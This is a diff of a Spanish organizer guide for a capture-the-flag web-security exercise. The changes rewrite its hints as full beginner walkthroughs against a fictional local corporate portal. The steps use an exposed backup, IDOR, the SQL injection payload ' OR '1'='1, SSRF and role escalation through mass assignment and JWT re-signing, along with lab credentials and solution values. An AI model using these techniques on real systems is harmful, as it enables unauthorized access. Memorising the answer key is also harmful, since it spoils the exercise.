@@ -27,7 +27,7 @@
 | ---- | ----- |
 | URL (local) | `http://localhost:3000` |
 | Cuenta de entrada | `intern@acme-corp.com` / `Welcome2026!` (rol `employee`) |
-| Dónde la encuentran los equipos | `Documents > IT Onboarding Guide` (dentro del portal) |
+| Dónde la encuentran los equipos | Ruta pública `/onboarding` (enlazada desde el login y la landing) |
 
 ### Secretos (valores por defecto; ver `lib/secrets.ts`)
 
@@ -61,10 +61,21 @@
 | `POST /api/flags/verify` | «Asset tag verification» | Valida una FLAG sin abrir la bóveda (uso de organizadores) |
 | `POST /api/phishing/verify` | Triaje SOC | Solo analyst/admin (ambientación) |
 
-## 3. Walkthrough completo (solución de referencia)
+## 3. Paso a paso (resolución completa, nivel principiante)
 
-> Comandos `curl` (Linux/macOS/Git-Bash) y su equivalente PowerShell donde
-> importa el manejo de cookies. Sustituid el host por el del despliegue.
+> No se asume experiencia previa. Cada paso indica cómo hacerlo con el
+> **navegador** (formularios de la app o DevTools) y con **Postman**.
+> Sustituid `http://localhost:3000` por la URL del despliegue.
+>
+> ### 3.0. Herramientas (5 minutos, una sola vez)
+> 1. **Navegador** Chrome o Edge.
+> 2. **Postman**: descargar de https://www.postman.com/downloads/, abrir y pulsar *Create new → HTTP Request*. No hace falta cuenta.
+> 3. En Postman cada petición es: elegir **método** (GET/POST/PATCH) → escribir la **URL** → pulsar **Send**. Para enviar JSON: pestaña **Body → raw → JSON** y pegar el cuerpo. **Las cookies se guardan solas**: haced primero el login en Postman y el resto de pestañas reutilizan la sesión sin hacer nada más.
+>
+> ### 3.1. La consola del navegador (DevTools, 2 minutos)
+> 1. Pulsar **F12** (o Ctrl+Mayúsculas+I). Se abre el panel de desarrollo.
+> 2. Pestaña **Network**: muestra todo lo que pide cada página. Recargad (F5) para verlo.
+> 3. Pestaña **Application → Cookies**: aquí vive la sesión (`acme_session`). Sirve para copiarla si hace falta llevarla a Postman.
 
 **Paso 1 — Entrar.** La guía de onboarding es pública (ruta `/onboarding`,
 sin login, enlazada desde el login y la landing) y trae la cuenta temporal:
@@ -74,8 +85,21 @@ curl -c jar.txt -X POST http://localhost:3000/api/auth/login \
   -d '{"email":"intern@acme-corp.com","password":"Welcome2026!"}'
 ```
 
+> **En el navegador (recomendado):**
+> 1. Abrir `http://localhost:3000/onboarding` (enlaces *Start here* de la portada y *onboarding guide* del login).
+> 2. Copiar usuario `intern@acme-corp.com` y contraseña `Welcome2026!`.
+> 3. Ir a *Employee Login*, pegar ambos campos, *Sign in* → entra al Dashboard.
+>
+> **En Postman (deja la sesión guardada para los pasos siguientes):**
+> 1. Pestaña nueva → método **POST** → URL `http://localhost:3000/api/auth/login`.
+> 2. Pestaña **Body → raw → JSON** → pegar `{"email":"intern@acme-corp.com","password":"Welcome2026!"}` → **Send**. Debe devolver `{"ok":true,...}`.
+
 **Paso 2 — Reconocimiento.** Abrir `/robots.txt` y `GET /api/config`. Anotar
 `/backup/`, `/analyst`, `/vault`, `/api/shadow/archive`, `/api/scanner`.
+
+> **En el navegador:**
+> 1. Abrir `http://localhost:3000/robots.txt` y anotar las 5 rutas.
+> 2. Con el Dashboard abierto, pulsar F12 → pestaña **Network** → recargar (F5) → clic en la fila `config` → pestaña **Preview**: veréis el mapa interno (`archive`, `linkChecker`, `analystWorkspace`, `vault`).
 
 **Paso 3 — Backup.** Descargar el snapshot (no pide login):
 ```bash
@@ -83,12 +107,22 @@ curl http://localhost:3000/backup/env.backup
 ```
 Anotar `BETTER_AUTH_SECRET`, `INTERNAL_API_TOKEN` y `VAULT_CUSTODIAN_1`.
 
+> **En el navegador:**
+> 1. Abrir `http://localhost:3000/backup` (no pide login) → clic en `env.backup`.
+> 2. Copiar a un bloc de notas estos tres valores: `BETTER_AUTH_SECRET`, `INTERNAL_API_TOKEN` y `VAULT_CUSTODIAN_1`.
+
 **Paso 4 — IDOR.** Con la sesión del paso 1:
 ```bash
 curl -b jar.txt 'http://localhost:3000/api/users/me?id=1'
 ```
 La `internalNote` de V. Ashford confirma el shadow archive, el token en los
 backups y que el custodio-2 lo tiene L. Fernández en el workspace.
+
+> **En el navegador:**
+> 1. Con la sesión iniciada, abrir `http://localhost:3000/profile?id=1`.
+> 2. Leer entera la tarjeta amarilla *Internal HR note*.
+>
+> **En Postman:** pestaña nueva → `GET http://localhost:3000/api/users/me?id=1` → Send (usa la sesión guardada del paso 1).
 
 **Paso 5 — SQLi en tickets.** La búsqueda filtra restringidos… salvo con
 inyección:
@@ -100,6 +134,12 @@ Leer el **ticket #1042** (procedimiento VAULT-2026-04 completo) y el **#1044**
 (confiesa el aprovisionamiento temporal vía perfil). Atajo equivalente:
 `GET /api/tickets?id=1042`.
 
+> **En el navegador (lo más fácil):**
+> 1. Ir a **Tickets** → en el buscador de la cola escribir exactamente `' OR '1'='1` (con comillas simples y espacios) → *Go*.
+> 2. Ahora la lista muestra también los restringidos: abrir el **#1042** y leer el **#1044**.
+>
+> **En Postman:** `GET http://localhost:3000/api/tickets`, pestaña **Params**: añadir `q` = `' OR '1'='1` → Send. Atajo: `GET .../api/tickets?id=1042`.
+
 **Paso 6 — SSRF.** Pedir al inspector que lea el archivo interno pasando el
 token del paso 3:
 ```bash
@@ -108,6 +148,13 @@ curl -b jar.txt -X POST http://localhost:3000/api/scanner \
   -d '{"url":"/api/shadow/archive","serviceToken":"acme-int-7f3a9c2e-token"}'
 ```
 Respuesta: `"custodian-1":"ACME-7F3A-91KD"` + memo hacia `/analyst`.
+
+> **En el navegador (sin herramientas):**
+> 1. Ir a **Documents → Preview by URL**.
+> 2. En *Document URL* escribir `/api/shadow/archive`; en *Service token* pegar el `INTERNAL_API_TOKEN` del paso 3 → *Fetch preview*.
+> 3. Copiar el valor de `"custodian-1"` de la respuesta.
+>
+> **En Postman:** `POST http://localhost:3000/api/scanner`, Body raw JSON con `url` y `serviceToken` (ver comando curl de arriba).
 
 **Paso 7 — Escalada a analyst** (cualquiera de las 3 vías vale):
 
@@ -124,11 +171,29 @@ Respuesta: `"custodian-1":"ACME-7F3A-91KD"` + memo hacia `/analyst`.
   en HS256 con `BETTER_AUTH_SECRET` y usarlo como cookie `acme_session` o
   `Authorization: Bearer`.
 
+> **Vía A en el navegador (la más fácil, 1 minuto):**
+> 1. Con la sesión iniciada, pulsar F12 → pestaña **Console**.
+> 2. Pegar esto y pulsar Enter:
+> ```js
+> await fetch("/api/users/me", { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ role: "analyst" }) }).then(r => r.json())
+> ```
+> 3. Debe responder `{"ok":true,"role":"analyst"}`. Recargar (F5): el rol del lateral cambia a *analyst*.
+>
+> **Vía A en Postman:** `PATCH http://localhost:3000/api/users/me`, Body raw JSON `{"role":"analyst"}` → Send.
+>
+> **Vía B en Postman:** `POST http://localhost:3000/api/sso/sign-up/email`, Body raw JSON con `name`, un `email` nuevo, `password` y `"role":"analyst"` → Send (queda logueado como analista directamente).
+>
+> **Vía C en el navegador con jwt.io (opcional):** 1. Abrir https://jwt.io. 2. En DevTools → *Application → Cookies* copiar el valor de `acme_session` y pegarlo en el campo *Encoded* de jwt.io. 3. En *Payload* cambiar `"role"` a `"analyst"`. 4. En *Verify Signature* pegar el `BETTER_AUTH_SECRET` del paso 3: el token se refirma solo. 5. Copiar el nuevo token y sustituir la cookie (doble clic sobre su valor, pegar, Enter). Recargar.
+
 **Paso 8 — Custodio-2:**
 ```bash
 curl -b jar.txt http://localhost:3000/api/analyst/panel
 # → "custodian-2":"ACME-9C2E-44ZX" (también visible en la página /analyst)
 ```
+
+> **En el navegador:** abrir `http://localhost:3000/analyst` → copiar `custodian-2` de la tarjeta oscura.
+>
+> **En Postman:** `GET http://localhost:3000/api/analyst/panel` → Send.
 
 **Paso 9 — Bóveda y FLAG:**
 ```bash
@@ -139,57 +204,50 @@ curl -b jar.txt -X POST http://localhost:3000/api/vault/unlock \
 ```
 El equipo debe reportar `reference` al contacto del memo con su nombre de equipo.
 
-## 4. Guía por etapa (diagnóstico + pistas graduadas)
+> **En el navegador (sin herramientas):**
+> 1. Abrir `http://localhost:3000/vault`.
+> 2. Pegar cada valor en su campo (*First custodian fragment*, *Second custodian fragment*, *Service token*) → *Request dual authorization*.
+> 3. Aparecen el memo desclasificado, la `reference` (la FLAG) y a quién notificarla con el nombre del equipo.
 
-> Cómo usarla: localizad al equipo por lo que ya tiene (ver §1) y dad **solo el
-> nivel de pista necesario**. No reveléis nunca literales (tokens, fragmentos)
-> salvo en el nivel 3, y jamás la FLAG.
+## 4. Guía por etapa (diagnóstico + solución)
+
+> Cómo usarla: localizad al equipo por lo que ya tiene (ver §1) e indicadle
+> directamente el siguiente paso de la solución. Esta guía no contiene pistas:
+> contiene la resolución exacta para que podáis apoyar sin investigar.
 
 ### E0 — Entrada y reconocimiento
 - **Señal de atasco:** «no sé ni por dónde empezar / no tengo cuenta».
-- 🟢 Pista 1: «Eres un empleado nuevo sin cuenta. La propia página de login menciona una guía de onboarding pública. ¿Dónde está y qué trae?»
-- 🟡 Pista 2: «`/onboarding` trae una cuenta temporal. Y fíjate en qué consume el dashboard en la pestaña de red.»
-- 🔴 Solución: credenciales de la guía pública + `/robots.txt` + `/api/config`.
+- ✅ Solución: credenciales de la guía pública + `/robots.txt` + `/api/config`.
 - 📣 **Para la presentación:** esto se llama **reconocimiento pasivo / *footprinting***: enumerar la superficie expuesta a partir de ficheros públicos (`robots.txt`, `sitemap.xml`) y del tráfico del propio frontend. `robots.txt` no es un control de acceso: todo lo listado ahí es legible por cualquiera. Referencias: [MITRE ATT&CK — Reconnaissance (TA0043)](https://attack.mitre.org/tactics/TA0043/), [documentación de Google sobre robots.txt](https://developers.google.com/search/docs/crawling-indexing/robots/intro).
 - 🌍 **Caso real (práctica documentada):** las entradas `Disallow:` han servido repetidamente como mapa para encontrar paneles de administración, backups y APIs internas en auditorías y programas de *bug bounty*. Análisis del patrón: [ScanSearch — filtraciones vía robots.txt y sitemap.xml](https://scansearch.net/en/articles/uncovering-sensitive-data-leaks-robots-txt-sitemap-xml/), [Infosec Writeups — el playbook de robots.txt](https://infosecwriteups.com/disallowed-but-discoverable-the-hackers-robots-txt-playbook-73dca570f23e).
 
 ### E1 — Backup expuesto (CWE-530 / CWE-798)
 - **Señal:** tienen sesión pero no avanzan.
-- 🟢 «Hay una notificación del sistema sobre una tarea nocturna. ¿A dónde apunta?»
-- 🟡 «Abre `/backup`. ¿Qué publica el trabajo nocturno y qué contiene?»
-- 🔴 `GET /backup/env.backup` → secreto, token, custodio-1.
+- ✅ Solución: `GET /backup/env.backup` → secreto, token, custodio-1.
 - 📣 **Para la presentación:** esto se llama **exposición de secretos** (credenciales y tokens en backups, repositorios o ficheros `.env` publicados). Referencias: [CWE-530 (backup expuesto)](https://cwe.mitre.org/data/definitions/530.html), [CWE-798 (credenciales hardcodeadas)](https://cwe.mitre.org/data/definitions/798.html).
 - 🌍 **Caso real — Uber (2016):** atacantes encontraron claves de AWS en un repositorio de GitHub de un ingeniero y descargaron datos de **57 millones** de usuarios y conductores. Uber lo ocultó más de un año pagando 100.000 $ a los atacantes. Impacto: acuerdo de **148 millones $** con los estados de EE. UU. y condena penal de su CSO por encubrimiento. Fuentes: [BBC](https://www.bbc.co.uk/news/technology-42075306), [Huntress — análisis del caso](https://www.huntress.com/threat-library/data-breach/uber-data-breach).
 
 ### E2 — IDOR en fichas (CWE-639)
 - **Señal:** tienen el backup pero no saben qué hacer con el token.
-- 🟢 «Los enlaces del directorio llevan un `?id=`. ¿Qué pasa si miras la ficha número 1?»
-- 🟡 «La ficha incluye una nota interna que no debería verse. Léela entera.»
-- 🔴 `GET /api/users/me?id=1` → nota de la CEO (shadow archive + custodios).
+- ✅ Solución: `GET /api/users/me?id=1` → nota de la CEO (shadow archive + custodios).
 - 📣 **Para la presentación:** esto se llama **IDOR (*Insecure Direct Object Reference*)**, hoy clasificado como **BOLA (*Broken Object-Level Authorization*)**: el servidor no comprueba que el objeto pedido (`id=1`) pertenezca al usuario, basta con adivinar el identificador. Es el riesgo nº 1 del OWASP API Security Top 10. Referencias: [CWE-639](https://cwe.mitre.org/data/definitions/639.html), [OWASP API Security Top 10](https://owasp.org/API-Security/).
 - 🌍 **Caso real — First American Financial (2019):** su web exponía documentos hipotecarios con IDs secuenciales, sin login: cambiando un dígito se accedía a los de otros clientes. Expuestos **885 millones** de documentos (cuentas bancarias, SSNs, declaraciones). Impacto: investigación del regulador de Nueva York y multa, además de demandas colectivas. Fuentes: [Krebs on Security](https://krebsonsecurity.com/2019/05/first-american-financial-corp-leaked-hundreds-of-millions-of-title-insurance-records/), [New York Times](https://www.nytimes.com/2019/05/24/technology/data-leak-first-american.html).
 
 ### E3 — SQLi en tickets (CWE-89)
 - **Señal:** no encuentran el procedimiento de la bóveda.
-- 🟢 «La cola dice que entiende operadores avanzados. Prueba a romper el filtro con comillas.»
-- 🟡 «Un clásico `' OR '1'='1` en el parámetro de búsqueda. ¿Cuántos tickets salen ahora?»
-- 🔴 Query del paso 5 → tickets #1042 (procedimiento) y #1044 (pista de escalada).
+- ✅ Solución: inyectar `' OR '1'='1` en el parámetro de búsqueda (paso 5) → tickets #1042 (procedimiento) y #1044 (pista de escalada).
 - 📣 **Para la presentación:** esto se llama **inyección SQL (SQLi)**: la entrada del usuario se concatena en la consulta y `' OR '1'='1` convierte el filtro en «devolver todo». Lleva 25 años en el OWASP Top 10. Referencias: [CWE-89](https://cwe.mitre.org/data/definitions/89.html), [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/).
 - 🌍 **Caso real — TalkTalk (2015):** atacantes (uno de 15 años, con la herramienta SQLMap) explotaron SQLi en tres páginas heredadas de Tiscali y accedieron a datos de **156.959 clientes** (incluidas 15.656 cuentas bancarias). La empresa había sufrido dos SQLi previas sin reaccionar. Impacto: multa récord entonces de **400.000 £** del regulador británico (ICO), que sentenció que «la SQLi es bien conocida, existen defensas y TalkTalk debía conocer el riesgo». Fuentes: [ICO — cronología de la investigación](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded), [BBC](https://www.bbc.com/news/business-37565367), [Wikipedia](https://en.wikipedia.org/wiki/2015_TalkTalk_data_breach).
 
 ### E4 — SSRF (CWE-918)
 - **Señal:** tienen el token pero el navegador les da 403 en el archivo.
-- 🟢 «Hay dos formularios que hacen que el *servidor* visite URLs por ti: vista previa de documentos y el webhook de ajustes.»
-- 🟡 «El inspector acepta rutas internas y un token de servicio. Pídele `/api/shadow/archive`.»
-- 🔴 Comando del paso 6 → custodio-1 + memo.
+- ✅ Solución: pedir al inspector que lea `/api/shadow/archive` pasando el token (paso 6) → custodio-1 + memo.
 - 📣 **Para la presentación:** esto se llama **SSRF (*Server-Side Request Forgery*)**: el atacante consigue que el *servidor* haga peticiones en su nombre, alcanzando recursos internos (red privada, metadatos cloud) inaccesibles desde fuera. Referencias: [CWE-918](https://cwe.mitre.org/data/definitions/918.html), [OWASP Top 10](https://owasp.org/Top10/).
 - 🌍 **Caso real — Capital One (2019):** una atacante explotó SSRF en un WAF para consultar el servicio de metadatos de AWS, robar las credenciales temporales del servidor y descargar datos de **106 millones** de solicitantes de tarjetas. Impacto: multa de **80 M$** del regulador bancario (OCC) + acuerdo judicial de **190 M$**, y condena penal de la atacante. Fuentes: [Capital One — información oficial del incidente](https://www.capitalone.com/digital/facts2019/), [Huntress — análisis técnico SSRF](https://www.huntress.com/threat-library/data-breach/capital-one-data-breach).
 
 ### E5 — Escalada a analyst (CWE-915 / CWE-284)
 - **Señal:** tienen custodio-1 pero `/analyst` les da 403.
-- 🟢 «Necesitas el rol de analista. ¿Dónde se cambia tu rol? ¿Qué campos acepta realmente ese formulario?»
-- 🟡 «Mira el ticket #1044 otra vez. Y prueba a registrarte en el SSO… ¿qué campos acepta?»
-- 🔴 Vías 7A/7B/7C → `/analyst` → custodio-2.
+- ✅ Solución: cualquiera de las vías 7A/7B/7C → `/analyst` → custodio-2.
 - 📣 **Para la presentación:** esto combina **asignación masiva (*Mass Assignment*, CWE-915)** —el servidor aplica campos que el cliente no debería controlar, como `role`— con **secretos débiles (CWE-798)** que permiten forjar sesiones. Referencias: [CWE-915](https://cwe.mitre.org/data/definitions/915.html), [OWASP — Mass Assignment Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md).
 - 🌍 **Casos reales:**
   - *GitHub (2012):* Egor Homakov explotó mass assignment en Rails para añadir su clave SSH a la organización y hacer ***push* al repositorio maestro de Ruby on Rails**. Impacto: GitHub auditó todo su código y Rails cambió a listas blancas por defecto. Fuente: [Ars Technica](https://arstechnica.com/information-technology/2012/03/hacker-commandeers-github-to-prove-vuln-in-ruby/).
@@ -197,9 +255,7 @@ El equipo debe reportar `reference` al contacto del memo con su nombre de equipo
 
 ### E6 — Bóveda (objetivo)
 - **Señal:** tienen los 3 valores pero falla.
-- 🟢 «La bóveda exige los tres valores *juntos* y tal cual: revisa espacios y guiones.»
-- 🟡 «El error es genérico a propósito; verifica cada valor contra su fuente (backup, archivo, panel).»
-- 🔴 Comando del paso 9 → FLAG + instrucciones de reporte.
+- ✅ Solución: presentar los tres valores juntos y tal cual en el paso 9 (revisar espacios y guiones; el error es genérico a propósito) → FLAG + instrucciones de reporte.
 - 📣 **Para la presentación:** la lección final es el **control de acceso roto (*Broken Access Control*, nº 1 del OWASP Top 10)**: cada fallo aislado parecía menor, pero encadenados permiten llegar a la función más sensible del sistema. Referencia: [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/).
 - 🌍 **Caso real — Panera Bread (2018):** su web exponía una API **sin autenticación** que devolvía millones de registros de clientes (nombres, emails, direcciones, cumpleaños y tarjetas parciales) con solo conocer el formato de la petición. Impacto: exposición masiva de datos de fidelización y daño reputacional. Fuente: [Krebs on Security](https://krebsonsecurity.com/2018/04/panerabread-com-leaks-millions-of-customer-records/).
 
@@ -254,6 +310,6 @@ al reiniciar vuelve al estado inicial. No hay migraciones ni ficheros que borrar
 
 1. Nunca digáis las palabras: SQLi, IDOR, SSRF, XSS, escalada, FLAG, CTF, Better Auth.
 2. Hablad como soporte IT de la empresa ficticia («¿has mirado la ficha del empleado 1?», «el inspector de enlaces acepta recursos internos»).
-3. Dad pistas de nivel 🟢 primero; subid solo si llevan ≥20–30 min atascados en el mismo punto.
-4. No resolváis por ellos: orientad al siguiente descubrimiento, no al comando final.
+3. Ayudad con el siguiente paso de la solución (ver §4); no deis la FLAG ni los literales salvo que el equipo esté bloqueado en ese punto exacto.
+4. No resolváis por ellos más de lo necesario: orientad al siguiente descubrimiento, no al comando final.
 5. Si un equipo reporta la FLAG, verificadla con `/api/flags/verify` y anotad orden de llegada y nombre del equipo.
